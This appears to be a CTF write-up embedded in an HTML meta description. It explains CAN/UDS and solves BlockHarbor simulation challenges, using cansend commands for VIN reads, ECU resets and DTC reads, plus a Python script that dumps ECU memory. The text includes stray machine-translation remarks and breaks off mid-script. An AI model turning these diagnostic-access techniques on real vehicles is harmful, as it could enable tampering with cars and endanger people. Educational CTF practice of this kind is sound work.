+  <meta property="og:description" content="&lt;p&gt;Hello! I am newp1ayer48 from Hackyboiz, responsible for the low-level area! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image01.jpg&#34; alt=&#34;image01.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In the automotive field, a communication protocol that is frequently used and applied is CAN communication. Security vulnerabilities can also occur in this CAN communication! Many CTFs and competitions are also being held targeting the automotive sector (Defcon also has a Car Hacking Village).&lt;/p&gt;
+&lt;p&gt;In this article, we&amp;#x2019;ll solve a problem from the BlockHarbor CTF, one of the most famous CTFs for vehicle hacking, to learn about vehicle communication and the resulting security vulnerabilities!&lt;/p&gt;
+&lt;h2 id=&#34;1-CAN-Bus-amp-UDS&#34;&gt;&lt;a href=&#34;#1-CAN-Bus-amp-UDS&#34; class=&#34;headerlink&#34; title=&#34;1. CAN Bus &amp;amp; UDS&#34;&gt;&lt;/a&gt;1. CAN Bus &amp;amp; UDS&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image02.png&#34; alt=&#34;[image02.png](https://t-shaped-person.tistory.com/51)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;CAN (Controller Area Network) communication is a protocol developed for communication between devices within a vehicle, such as ECUs (Electronic Control Units). It uses a message-based, low-level network communication system in a non-host bus manner. Since it was developed in 1983, it predates the HTTP protocol! A basic CAN message consists of 8 Bytes, and the extended version, CAN-FD (Flexible Data-rate), can represent data up to 64 Bytes.&lt;/p&gt;
+&lt;p&gt;Furthermore, the international standard for CAN communication is specified by ISO 15765.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image03.png&#34; alt=&#34;[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;UDS stands for Unified Diagnostic Services, and you&amp;#x2019;ll frequently encounter this term when dealing with vehicle CTFs and CAN communication. It is a protocol used for diagnostic communication, primarily employed with ECUs. Since it is a higher-level protocol than the low-level CAN protocol, it allows for various functions such as data Read/Write (R/W).&lt;/p&gt;
+&lt;p&gt;The international standard for the UDS message structure operating over CAN communication was designated by ISO 15765.&lt;/p&gt;
+&lt;p&gt;Since knowing the UDS message structure is crucial for the BlockHarbor CTF challenge we are about to solve, let&amp;#x2019;s briefly look at it. The UDS message is structured as shown in the picture above. A simple explanation of each part is as follows:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CAN ID: The ECU that will transmit or receive the message.&lt;/li&gt;
+&lt;li&gt;PCI (Protocol Control Information): Primarily used for the length of the UDS message, Flow Control, etc.&lt;/li&gt;
+&lt;li&gt;SID (Service Identifier): Identifies the requested service.&lt;ul&gt;
+&lt;li&gt;Sub Function Byte: Detailed options for the SID.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;DID (Data Identifier): Identifies the data being accessed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now, I will explain some of the more important items among these.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image04.png&#34; alt=&#34;image04.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The CAN ID values for each ECU are set as hexadecimal values according to ISO 15765-4.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;7DF&lt;/code&gt; is primarily the identifier used for broadcasting to all ECUs or for internal functions/settings to be delivered to an ECU.&lt;/li&gt;
+&lt;li&gt;For transmission, the CAN IDs are designated as &lt;code&gt;7E0&lt;/code&gt; for ECU 1, &lt;code&gt;7E1&lt;/code&gt; for ECU 2, and so on.&lt;/li&gt;
+&lt;li&gt;For reception, the ID is designated as the transmission value &lt;code&gt;+ 0x8&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The SID (Service Identifier) can simply be described as the identifier that signals what action (service) will be performed. Since the SID values are also standardized, you can directly check the SID value corresponding to a service through the &lt;a href=&#34;https://en.wikipedia.org/wiki/Unified_Diagnostic_Services&#34;&gt;document&lt;/a&gt;. The corresponding Response SID (RSID) value is the request SID value &lt;code&gt;+ 0x40&lt;/code&gt;. If the RSID, which is the response to the requested SID, is successfully received, it indicates that the communication was successful.&lt;/p&gt;
+&lt;p&gt;Additionally, there are commands among the SIDs that include a Sub Function Byte. This is used to designate a more detailed service request when an SID is requested. It is optional and may or may not be used, which can be confirmed by checking the documentation.&lt;/p&gt;
+&lt;p&gt;The DID (Data Identifier) is the identifier that refers to the data. Many DID values are also reserved according to the ISO-14229 standard, so you can check the &lt;a href=&#34;https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/&#34;&gt;document&lt;/a&gt; to find the appropriate DID value. The most representative example of a DID is the VIN (Vehicle Identification Number) value, which is &lt;code&gt;F190&lt;/code&gt;. If you request this DID value along with an SID, the service corresponding to the SID will be executed targeting the VIN.&lt;/p&gt;
+&lt;p&gt;In the case of SIDs that use the Sub Function Byte, which we just explained, there are instances where a DID may not be necessary.&lt;/p&gt;
+&lt;p&gt;When solving the upcoming BlockHarbor CTF problems, it is absolutely essential to keep the &lt;a href=&#34;https://en.wikipedia.org/wiki/Unified_Diagnostic_Services&#34;&gt;SID&lt;/a&gt; and &lt;a href=&#34;https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/&#34;&gt;DID&lt;/a&gt; documentation pages open and look up the commands as you go!&lt;/p&gt;
+&lt;h3 id=&#34;1-1-CAN-Utils&#34;&gt;&lt;a href=&#34;#1-1-CAN-Utils&#34; class=&#34;headerlink&#34; title=&#34;1.1. CAN Utils&#34;&gt;&lt;/a&gt;1.1. CAN Utils&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image05.jpg&#34; alt=&#34;image05.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To transmit and receive CAN/UDS messages, you can use the can-utils tool. This tool is based on SocketCAN, which implements the CAN protocol on Linux. I&amp;#x2019;ll explain this using the example shown below.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;candump -a vcan0,7E0:7FF&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;candump&lt;/code&gt; is a tool that allows you to receive CAN/UDS messages. By specifying the desired CAN network interface, you can receive CAN messages from that interface. In the example above , the &lt;code&gt;-a&lt;/code&gt; option was added to show the ASCII results along with the CAN message, and masking arguments &lt;code&gt;7E0&lt;/code&gt; and &lt;code&gt;7FF&lt;/code&gt; were added to receive data only from ECU 1.&lt;/p&gt;
+&lt;p&gt;When solving the CTF problems later, this command will be frequently used on one terminal to run and check the responses.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#0322F190 &amp;amp;&amp;amp; cansend vcan0 7E0#30000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;cansend&lt;/code&gt; is a tool that allows you to transmit CAN/UDS messages. Similarly, it can send a CAN message to the desired CAN network interface. For the upcoming problems, you will need to construct the message by properly configuring the SID and DID according to the UDS format explained earlier and then transmit it.&lt;/p&gt;
+&lt;p&gt;Additionally, for cases where the response data is larger than the basic CAN message length of 8 Bytes, a commonly used technique is to send a Flow Control request, such as &lt;code&gt;30000000&lt;/code&gt;, along with the message to ensure all data is received.&lt;/p&gt;
+&lt;p&gt;By using &lt;code&gt;cansend&lt;/code&gt; to transmit a message and then confirming the response data with &lt;code&gt;candump&lt;/code&gt;, you can verify the entire CAN/UDS communication process.&lt;/p&gt;
+&lt;h2 id=&#34;2-Blockharbor-CTF&#34;&gt;&lt;a href=&#34;#2-Blockharbor-CTF&#34; class=&#34;headerlink&#34; title=&#34;2. Blockharbor CTF&#34;&gt;&lt;/a&gt;2. Blockharbor CTF&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image06.jpg&#34; alt=&#34;image06.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;BlockHarbor CTF is an Automotive Capture the Flag (CTF) competition created by the automotive cybersecurity company, Block Harbor. It is highly recommended for solving vehicle hacking problems because it provides a virtual CAN interface environment and a simulation environment for communication between ECUs, making it convenient for hands-on practice with CAN/UDS commands.&lt;/p&gt;
+&lt;p&gt;The site is broadly composed of two parts: the &lt;a href=&#34;https://proving-grounds.blockharbor.io/&#34;&gt;CTF Problem Site&lt;/a&gt;, which is built on the CTFd platform, and the &lt;a href=&#34;https://core.ed.vsec.blockharbor.io/block/learn&#34;&gt;VSEC&lt;/a&gt; site, which establishes the vehicle simulation environment. If you are new to CAN/UDS and vehicle systems, it is recommended that you start with the &amp;#x201C;Getting Started&amp;#x201D; problems on the CTF problem site.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image07.png&#34; alt=&#34;image07.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you connect to &lt;a href=&#34;https://core.ed.vsec.blockharbor.io/block/learn&#34;&gt;VSEC&lt;/a&gt;, navigate to Other - Learn - SIMULATIONS. By clicking the terminal icon on the right side of Proving Grounds, you can access the vehicle simulation environment&amp;#x2019;s terminal via the web in various environments. Since we will be solving the UDS Challenge problems, we will connect to the UDS Challenge terminal. If you are solving different problems, you can connect to another simulation terminal and use the environment appropriate for that problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image08.png&#34; alt=&#34;image08.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you connect via the terminal icon, you will access a tmux shell like the one shown above. You can solve the CTF problems you&amp;#x2019;ve identified within this environment.&lt;/p&gt;
+&lt;h3 id=&#34;2-1-tmux-setting&#34;&gt;&lt;a href=&#34;#2-1-tmux-setting&#34; class=&#34;headerlink&#34; title=&#34;2.1 tmux setting&#34;&gt;&lt;/a&gt;2.1 tmux setting&lt;/h3&gt;&lt;p&gt;To use the tmux terminal environment, you can configure a better problem-solving setup with a few tmux commands and settings. BlockHarbor itself has created a basic &lt;a href=&#34;https://cantreally.cyou/posts/how-i-use-tmux/&#34;&gt;tmux introduction&lt;/a&gt; via their landing page. I will explain a few of the frequently used commands from that guide.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image09.png&#34; alt=&#34;image09.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Terminal splitting&lt;/span&gt;
+Ctrl + b
+%
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Terminal moving&lt;/span&gt;
+Ctrl + b
+&amp;#x2190; &amp;#x2192;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# Terminal scroll&lt;/span&gt;
+Ctrl + b
+[
+&lt;span class=&#34;hljs-comment&#34;&gt;# End scroll&lt;/span&gt;
+Ctrl + c&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You didn&amp;#x2019;t provide the list of tmux commands, but based on your comment, here is the translation emphasizing the general idea:&lt;/p&gt;
+&lt;p&gt;The commands and settings listed above are those that are frequently used in practice. Terminal splitting and navigation are used especially often. For additional settings or commands you may want, you can check the &lt;a href=&#34;https://cantreally.cyou/posts/how-i-use-tmux/&#34;&gt;tmux intro&lt;/a&gt; or search online.&lt;/p&gt;
+&lt;h2 id=&#34;3-UDS-Challenge&#34;&gt;&lt;a href=&#34;#3-UDS-Challenge&#34; class=&#34;headerlink&#34; title=&#34;3. UDS Challenge&#34;&gt;&lt;/a&gt;3. UDS Challenge&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image10.png&#34; alt=&#34;image10.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The UDS Challenge problems we will solve are tackled by performing the actions required by the problem using UDS commands and controlling the vehicle environment. The &lt;a href=&#34;https://en.wikipedia.org/wiki/Unified_Diagnostic_Services&#34;&gt;SID&lt;/a&gt; and &lt;a href=&#34;https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/&#34;&gt;DID&lt;/a&gt; used to solve the problems can be found in the documentation introduced earlier.&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s start solving the problems right away!&lt;/p&gt;
+&lt;h3 id=&#34;3-1-Simulation-VIN&#34;&gt;&lt;a href=&#34;#3-1-Simulation-VIN&#34; class=&#34;headerlink&#34; title=&#34;3.1. Simulation VIN&#34;&gt;&lt;/a&gt;3.1. Simulation VIN&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image11.png&#34; alt=&#34;image11.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem requires you to retrieve the VIN (Vehicle Identification Number) using UDS.&lt;/p&gt;
+&lt;p&gt;The VIN is the Vehicle Identification Number, which was briefly discussed when explaining the commands earlier! The task is to query this value in the simulation environment.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image12.png&#34; alt=&#34;image12.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The translation is:&lt;/p&gt;
+&lt;p&gt;First, by checking the network interfaces in the simulation environment, you can confirm the virtual CAN interface, vcan0. You should target this interface when transmitting and receiving CAN/UDS messages.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image13.png&#34; alt=&#34;image13.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#0322F190 &amp;amp;&amp;amp; cansend vcan0 7E0#30000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To monitor the transmission and reception messages for the broadcast and ECU 1, I added masking for three CAN IDs in candump. Afterward, I combined the VIN DID and the Read Data By Identifier (SID) and transmitted the message. Since the response comes from ECU 1, by sending a Flow Control request to that ECU, the full VIN can be confirmed, and the flag can be identified!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;e66fb3f67ac3:~$ candump -a vcan0,&lt;span class=&#34;hljs-number&#34;&gt;7E0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;FF,&lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;FF,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;DF:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;FF
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;DF   [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt; F1 &lt;span class=&#34;hljs-number&#34;&gt;90&lt;/span&gt;               &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;.&amp;quot;..&amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;62&lt;/span&gt; F1 &lt;span class=&#34;hljs-number&#34;&gt;90&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;66&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;C &lt;span class=&#34;hljs-number&#34;&gt;61&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;..b..fla&amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E0&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;               &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0...&amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;67&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;B &lt;span class=&#34;hljs-number&#34;&gt;76&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;31&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;E &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;F &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;!g{     &amp;apos;&lt;/span&gt;
+  vcan0  &lt;span class=&#34;hljs-number&#34;&gt;7E8&lt;/span&gt;   [&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;]  &lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;D &lt;span class=&#34;hljs-number&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;68&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;D   &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;quot;      }&amp;apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;#x2019;s examine the received message in detail.&lt;/p&gt;
+&lt;p&gt;Upon making the Read Data By Identifier request (&lt;code&gt;22&lt;/code&gt;), we can confirm the correct RSID (&lt;code&gt;62&lt;/code&gt;) response. Following this, a large amount of data is returned, and continuous values like &lt;code&gt;21&lt;/code&gt; and &lt;code&gt;22&lt;/code&gt; are indicated before these data packets. This confirms that the data is continuous (a multi-frame transfer). &lt;/p&gt;
+&lt;h3 id=&#34;3-2-Startup-Message&#34;&gt;&lt;a href=&#34;#3-2-Startup-Message&#34; class=&#34;headerlink&#34; title=&#34;3.2. Startup Message&#34;&gt;&lt;/a&gt;3.2. Startup Message&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image14.png&#34; alt=&#34;image14.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem asks about how to restart an ECU. It also states that the diagnostic information is broadcast using &lt;code&gt;7DF&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image15.png&#34; alt=&#34;image15.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#021101&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The simple way to Restart the ECU is to send a Reset request (&lt;code&gt;11&lt;/code&gt;). For the Reset request used in this problem, we use the Default Session (&lt;code&gt;01&lt;/code&gt;) Sub Function Byte. Because of this, no separate DID is used. &lt;/p&gt;
+&lt;p&gt;When the ECU Reset request with the Default Session is transmitted, you can confirm the corresponding RSID response (&lt;code&gt;51&lt;/code&gt;). Subsequently, you can also obtain the flag information!&lt;/p&gt;
+&lt;h3 id=&#34;3-3-Engine-Trouble&#34;&gt;&lt;a href=&#34;#3-3-Engine-Trouble&#34; class=&#34;headerlink&#34; title=&#34;3.3. Engine Trouble?&#34;&gt;&lt;/a&gt;3.3. Engine Trouble?&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image16.png&#34; alt=&#34;image16.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem requires reading the Diagnostic Trouble Codes (DTCs). You must authenticate the flag by matching the DTC format, which is typically &lt;code&gt;Pxxxx-xx&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image17.png&#34; alt=&#34;image17.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#03190208&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The problem can be solved by sending a Read DTC Information request (&lt;code&gt;19&lt;/code&gt;). The DTC (Diagnostic Trouble Codes) can be viewed using a Status Mask. The detailed DTC Status Byte can be found in the &lt;a href=&#34;https://buly.kr/2UjxlRq&#34;&gt;AUTOSAR documentation&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The confirmed DTC is &lt;code&gt;P3E9F-01&lt;/code&gt;. Since DTCs are used in OBD2 for vehicle diagnostics, you can refer to the corresponding standard, the &lt;a href=&#34;https://piembsystech.com/iso-15031-protocol/&#34;&gt;ISO 15031&lt;/a&gt; document, to understand how to interpret the DTC code.&lt;/p&gt;
+&lt;h3 id=&#34;3-4-Secrets-in-Memory&#34;&gt;&lt;a href=&#34;#3-4-Secrets-in-Memory&#34; class=&#34;headerlink&#34; title=&#34;3.4. Secrets in Memory?&#34;&gt;&lt;/a&gt;3.4. Secrets in Memory?&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image18.png&#34; alt=&#34;image18.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This problem requires a Read Memory By Address request. The accessible memory area is stated to start from &lt;code&gt;0xC3F80000&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image19.png&#34; alt=&#34;image19.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)&lt;/span&gt;
+cansend vcan0 7DF&lt;span class=&#34;hljs-comment&#34;&gt;#072314C3F83000FF &amp;amp;&amp;amp; cansend vcan0 7E0#30000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Data in memory can be read using a memory read request (&lt;code&gt;23&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;A point to note here is that you must calculate and use the value (&lt;code&gt;14&lt;/code&gt;) corresponding to the AddressAndLengthFormatIdentifier (AALFId) before specifying the address. You can understand the explanation of AALFId by referring to &lt;a href=&#34;https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;amp;t=104s&#34;&gt;this video&lt;/a&gt;. Consequently, reading is possible by sending a read request for 255 (&lt;code&gt;FF&lt;/code&gt;) bytes using the value &lt;code&gt;14&lt;/code&gt;, which requests the use of a 4-byte address and 1-byte length format.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, data[:dlc]
+
+recvdata = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+    p.settimeout(&lt;span class=&#34;hljs-number&#34;&gt;0.5&lt;/span&gt;)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; addr &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;0xC3F83000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xC3F865ff&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xFF&lt;/span&gt;):
+        req_data = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x07\x23\x14&amp;quot;&lt;/span&gt; + addr.to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\xff&amp;quot;&lt;/span&gt;
+        p.send(build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7DF&lt;/span&gt;, req_data))
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
+            resp_frame = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+            resp_id, resp_data = dissect_can_frame(resp_frame)
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; resp_data:
+                recvdata += resp_data.hex()[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:]
+        &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; socket.timeout:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+
+        flow_control_data = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x30\x00\x00\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+        p.send(build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, flow_control_data))
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt;):
+            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
+                resp_frame = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+                _, resp_data = dissect_can_frame(resp_frame)
+                tempdata = resp_data.hex()[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:]
+                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; tempdata != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;00000000000000&amp;quot;&lt;/span&gt;:
+                    recvdata += tempdata
+            &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; socket.timeout:
+                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    hex_data_string = recvdata
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
+        byte_data = bytes.fromhex(hex_data_string)
+        ascii_string = byte_data.decode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ascii&amp;quot;&lt;/span&gt;, errors=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ignore&amp;quot;&lt;/span&gt;)
+        print(ascii_string)
+        
+    &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; ValueError:
